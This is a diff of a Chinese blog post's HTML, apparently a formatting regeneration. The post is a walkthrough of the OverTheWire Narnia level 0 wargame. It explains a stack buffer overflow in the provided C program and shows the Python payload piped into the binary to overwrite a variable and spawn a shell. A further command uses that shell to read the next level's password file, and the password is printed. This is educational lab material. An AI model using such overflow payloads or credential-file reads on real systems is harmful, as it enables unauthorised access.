@@ -286,7 +286,7 @@
             <audio id="bgm" autoplay="autoplay" loop="loop" src="https://cache-1253916356.file.myqcloud.com/Black%20Lab%20-%20This%20Night.mp3"></audio>
         
     
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 
     
@@ -526,24 +526,65 @@
 <p>说这道题简单是因为，这道题甚至不需要使用调试器，能看懂c语言，对堆栈有基本理解，熟悉Linux基本指令就能做出来。。。</p>
 <p>*<a href="http://overthewire.org/wargames/narnia/" target="_blank" rel="external">题目网站</a></p>
 <hr>
-<p>首先登录题目服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ssh narnia0@narnia.labs.overthewire.org</div><div class="line">Password:narnia0</div><div class="line">cd</div><div class="line">cd /narnia/</div></pre></td></tr></table></figure></p>
-<p><code>ls</code>看到题目文件:<code>narnia0.c</code></p>
+<p>首先登录题目服务器</p>
+<pre><code>ssh narnia0@narnia.labs.overthewire.org
+Password:narnia0
+cd
+cd /narnia/
+</code></pre><p><code>ls</code>看到题目文件:<code>narnia0.c</code></p>
 <p>看一下源码</p>
 <pre><code>cat narnia0.c
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">int main()&#123;</div><div class="line">    long val=0x41414141;</div><div class="line">    char buf[20];</div><div class="line"></div><div class="line">    printf(&quot;Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);</div><div class="line">    printf(&quot;Here is your chance: &quot;);</div><div class="line">    scanf(&quot;%24s&quot;,&amp;buf);</div><div class="line"></div><div class="line">    printf(&quot;buf: %s\n&quot;,buf);</div><div class="line">    printf(&quot;val: 0x%08x\n&quot;,val);</div><div class="line"></div><div class="line">    if(val==0xdeadbeef)</div><div class="line">        system(&quot;/bin/sh&quot;);</div><div class="line">    else &#123;</div><div class="line">        printf(&quot;WAY OFF!!!!\n&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>读一遍代码，是一个十分简单的C语言程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">首先对变量val进行赋值，然后申请了一个20字节的字符数组buf</div><div class="line"></div><div class="line">之后输出题目要求，获取用户对数组buf的输入</div><div class="line"></div><div class="line">用户输入后输出用户的输入和val的16进制值</div><div class="line"></div><div class="line">如果val的值与特定的数值匹配，则调用`/bin/sh`</div><div class="line"></div><div class="line">不匹配则输出失败信息</div></pre></td></tr></table></figure></p>
-<p>首先,题目要求是把val的值从<code>0x41414141</code>改变成<code>0xdeadbeef</code></p>
+</code></pre><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf(&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!\n&quot;);
+    printf(&quot;Here is your chance: &quot;);
+    scanf(&quot;%24s&quot;,&amp;buf);
+
+    printf(&quot;buf: %s\n&quot;,buf);
+    printf(&quot;val: 0x%08x\n&quot;,val);
+
+    if(val==0xdeadbeef)
+        system(&quot;/bin/sh&quot;);
+    else {
+        printf(&quot;WAY OFF!!!!\n&quot;);
+        exit(1);
+    }
+
+    return 0;
+}
+</code></pre><p>读一遍代码，是一个十分简单的C语言程序：</p>
+<pre><code>首先对变量val进行赋值，然后申请了一个20字节的字符数组buf
+
+之后输出题目要求，获取用户对数组buf的输入
+
+用户输入后输出用户的输入和val的16进制值
+
+如果val的值与特定的数值匹配，则调用`/bin/sh`
+
+不匹配则输出失败信息
+</code></pre><p>首先,题目要求是把val的值从<code>0x41414141</code>改变成<code>0xdeadbeef</code></p>
 <p>但是程序并没有提供修改<code>val</code>变量的可写入函数</p>
 <p>浏览代码，发现第五行变量<code>val</code>被赋值为:<code>0x41414141</code></p>
 <p>查看Ascii码表，算出对应字符串为:<code>AAAA</code><br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1504366763690&amp;di=6687ad195002154e5e4ac340ca4d9872&amp;imgtype=0&amp;src=http%3A%2F%2Fs2.sinaimg.cn%2Fmiddle%2F56d8ea90tac5177d3a0d1%26690" alt="Ascii码表"></p>
 <p>在第6行<code>char buf[20]</code>说明程序接受输入的缓冲区长度为20字节</p>
 <p>而在第10行<code>scanf()</code>函数允许最多输入长度为24字节，于是造成了缓冲区溢出，溢出的这4个字节就是达成目的的关键</p>
 <p>测试一下输入24个字节后溢出的四个字节会造成什么样的后果</p>
-<p>运行程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ ./narnia0        </div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance:</div></pre></td></tr></table></figure></p>
-<p>在这里程序在等待用户输入，也就是执行到了<code>scanf(&quot;%24s&quot;,&amp;buf)</code>函数</p>
+<p>运行程序:</p>
+<pre><code>narnia0@narnia:/narnia$ ./narnia0        
+Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance:
+</code></pre><p>在这里程序在等待用户输入，也就是执行到了<code>scanf(&quot;%24s&quot;,&amp;buf)</code>函数</p>
 <p>输入20个A 加上<code>BCDE</code>来测试</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Here is your chance: AAAAAAAAAAAAAAAAAAAABCDE</div><div class="line">buf: AAAAAAAAAAAAAAAAAAAABCDE</div><div class="line">val: 0x45444342</div><div class="line">WAY OFF!!!!</div></pre></td></tr></table></figure>
-<p>输出了<code>val: 0x45444342</code> 而对应的ascii即是<code>EDCB</code>,这说明可以修改内存中<code>val</code>的值！溢出的四个字节覆盖到了<code>val</code>上</p>
+<pre><code>Here is your chance: AAAAAAAAAAAAAAAAAAAABCDE
+buf: AAAAAAAAAAAAAAAAAAAABCDE
+val: 0x45444342
+WAY OFF!!!!
+</code></pre><p>输出了<code>val: 0x45444342</code> 而对应的ascii即是<code>EDCB</code>,这说明可以修改内存中<code>val</code>的值！溢出的四个字节覆盖到了<code>val</code>上</p>
 <p>注意这里的顺序,输入的最后是<code>BCDE</code>,但显示的顺序是<code>EDCB</code></p>
 <p><strong>因为栈机制是先进后出/后进先出,及如果依次入栈为1234,依次出栈的顺序就是4321,这点十分重要</strong></p>
 <p>现在要做的就算把<code>val</code>的值变成<code>0xdeadbeef</code></p>
@@ -551,25 +592,37 @@
 <p>所以在输入的时候顺序要为:<code>\xef\xbe\xad\xde</code> 及<code>A*20+\xef\xbe\xad\xde</code></p>
 <p>如何获得这串16进制数<code>\xef\xbe\xad\xde</code>对应的字符串呢？</p>
 <p>在Python中，可以使用<code>\x</code>对字符串进行转义，把输入的字符串当成16进制输出对应的字符</p>
-<p>如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; print &quot;\x41&quot;</div><div class="line">&gt;&gt;&gt; A</div></pre></td></tr></table></figure></p>
-<p>及输出了16进制数<code>41</code>对应的Ascii字符<code>A</code></p>
+<p>如:</p>
+<pre><code>&gt;&gt;&gt; print &quot;\x41&quot;
+&gt;&gt;&gt; A
+</code></pre><p>及输出了16进制数<code>41</code>对应的Ascii字符<code>A</code></p>
 <p>那么输出<code>\xef\xbe\xad\xde</code>对应的字符即:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;print &quot;\xef\xbe\xad\xde&quot;</div><div class="line">&gt;&gt;&gt;ﾭ�</div></pre></td></tr></table></figure>
-<p>但是由于各种奇怪的编码问题这个不存在的字符串你是不可能读懂的，即使能也会是乱码，因为根本没有字符去对应那串16进制码,但是计算机能懂就够了</p>
+<pre><code>&gt;&gt;&gt;print &quot;\xef\xbe\xad\xde&quot;
+&gt;&gt;&gt;ﾭ�
+</code></pre><p>但是由于各种奇怪的编码问题这个不存在的字符串你是不可能读懂的，即使能也会是乱码，因为根本没有字符去对应那串16进制码,但是计算机能懂就够了</p>
 <p>于是需要用到Linux中的“管道”功能，即把一个程序的输出作为另一个程序的输入</p>
 <p>例如:<code>netstat -an | grep 445</code><br><code>netstat -an</code>会列出所有端口，而<code>grep 445</code>则会进行筛选，只保留有445这个字符串的结果</p>
 <p>同理,如果要把Python程序的输出结果当做题目程序的输入，同样需要这个技巧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ python -c &apos;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&apos; | ./narnia0</div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�</div><div class="line">val: 0xdeadbeef</div></pre></td></tr></table></figure>
-<p>这句话:<code>python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0</code></p>
+<pre><code>narnia0@narnia:/narnia$ python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0
+Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+</code></pre><p>这句话:<code>python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39; | ./narnia0</code></p>
 <p><em>因为在这里不需要进入交互模式，<code>python -c &#39;xxx&#39;</code>命令会直接执行单引号中的代码，而不是在交互中进行<br>如果不加<code>-c</code>参数，直接执行<code>python xxxxx</code> ,系统则会去匹配当前目录下的<code>xxxxx</code>文件试图去用Python解释器执行</em></p>
 <p><em><code>|</code>即为管道，把<code>|</code>左边的输出结果当做输入传递给<code>|</code>右边的程序</em></p>
 <p>这时看变量<code>val</code>的值，已经变成了<code>0xdeadbeef</code>,多出的四个字节成功覆盖在了内存中变量<code>val</code>储存的位置</p>
 <p>再次查看C语言代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.  `if(val==0xdeadbeef)`</div><div class="line">2.  `system(&quot;/bin/sh&quot;);`</div></pre></td></tr></table></figure>
-<p>如果<code>val</code>的值变成了<code>0xdeadbeef</code>，程序将会调用<code>/bin/sh</code></p>
+<pre><code>1.  `if(val==0xdeadbeef)`
+2.  `system(&quot;/bin/sh&quot;);`
+</code></pre><p>如果<code>val</code>的值变成了<code>0xdeadbeef</code>，程序将会调用<code>/bin/sh</code></p>
 <p>第二题的密码在<code>etc/narnia_pass/narnia1</code> 如果直接查看会提示权限不够</p>
-<p>因此运行Python代码同时读取位于<code>etc/narnia_pass/narnia1</code>中的密钥:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">narnia0@narnia:/narnia$ (python -c &apos;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&apos;;echo &apos;cat /etc/narnia_pass/narnia1&apos;) | ./narnia0</div><div class="line">Correct val&apos;s value from 0x41414141 -&gt; 0xdeadbeef!</div><div class="line">Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�</div><div class="line">val: 0xdeadbeef</div><div class="line">efeidiedae</div></pre></td></tr></table></figure></p>
-<p>成功显示出了密钥，即下一道题的ssh密码</p>
+<p>因此运行Python代码同时读取位于<code>etc/narnia_pass/narnia1</code>中的密钥:</p>
+<pre><code>narnia0@narnia:/narnia$ (python -c &#39;print &quot;A&quot;*20 + &quot;\xef\xbe\xad\xde&quot;&#39;;echo &#39;cat /etc/narnia_pass/narnia1&#39;) | ./narnia0
+Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
+Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
+val: 0xdeadbeef
+efeidiedae
+</code></pre><p>成功显示出了密钥，即下一道题的ssh密码</p>
 <hr>
 <p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
 
